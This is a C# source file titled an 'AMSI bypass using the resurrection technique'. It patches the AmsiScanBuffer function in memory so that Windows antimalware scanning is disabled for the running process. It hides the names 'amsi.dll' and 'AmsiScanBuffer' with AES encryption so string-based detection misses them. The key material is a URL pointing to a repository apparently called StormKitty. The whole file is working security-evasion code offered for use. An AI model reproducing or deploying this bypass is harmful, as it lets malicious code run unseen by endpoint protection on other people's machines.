using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace AmsiResurrect
{
    /// <summary>
    /// AMSI bypass using the resurrection technique.
    /// Patches AmsiScanBuffer in-memory to neutralize antimalware scanning.
    /// </summary>
    public class Resurrect
    {
        private static readonly byte[] DeriveKey = new byte[]
        {
            104, 116, 116, 112, 115, 58, 47, 47, 103, 105,
            116, 104, 117, 98, 46, 99, 111, 109, 47, 76,
            105, 109, 101, 114, 66, 111, 121, 47, 83, 116,
            111, 114, 109, 75, 105, 116, 116, 121
        };

        private static readonly byte[] DeriveSalt = new byte[]
        {
            255, 64, 191, 111, 23, 3, 113, 119,
            231, 121, 252, 112, 79, 32, 114, 156
        };

        /// <summary>
        /// Patches AmsiScanBuffer to return E_INVALIDARG (0x80070057),
        /// effectively disabling AMSI scanning for the current process.
        /// </summary>
        public static void Patch()
        {
            // mov eax, 0x80070057 (E_INVALIDARG); ret
            byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

            // Encrypted strings for "amsi.dll" and "AmsiScanBuffer"
            var libCipher = new byte[]
            {
                61, 15, 16, 58, 73, 19, 94, 23,
                215, 187, 191, 40, 41, 244, 25, 224
            };

            var procCipher = new byte[]
            {
                13, 30, 1, 126, 74, 73, 34, 111,
                167, 7, 75, 198, 190, 197, 132, 113
            };

            IntPtr hModule = NativeMethods.LoadLibrary(Decrypt(libCipher));
            if (hModule == IntPtr.Zero)
                return;

            IntPtr targetAddr = NativeMethods.GetProcAddress(hModule, Decrypt(procCipher));
            if (targetAddr == IntPtr.Zero)
                return;

            uint oldProtect;
            NativeMethods.VirtualProtect(targetAddr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, targetAddr, patch.Length);
        }

        /// <summary>
        /// Decrypts AES-256-CBC encrypted byte arrays using PBKDF2 key derivation.
        /// </summary>
        private static string Decrypt(byte[] ciphertext)
        {
            using (var ms = new MemoryStream())
            using (var aes = new RijndaelManaged())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;

                var kdf = new Rfc2898DeriveBytes(DeriveKey, DeriveSalt, 1000);
                aes.Key = kdf.GetBytes(aes.KeySize / 8);
                aes.IV = kdf.GetBytes(aes.BlockSize / 8);

                using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(ciphertext, 0, ciphertext.Length);
                    cs.Close();
                }

                return Encoding.UTF8.GetString(ms.ToArray());
            }
        }
    }
}
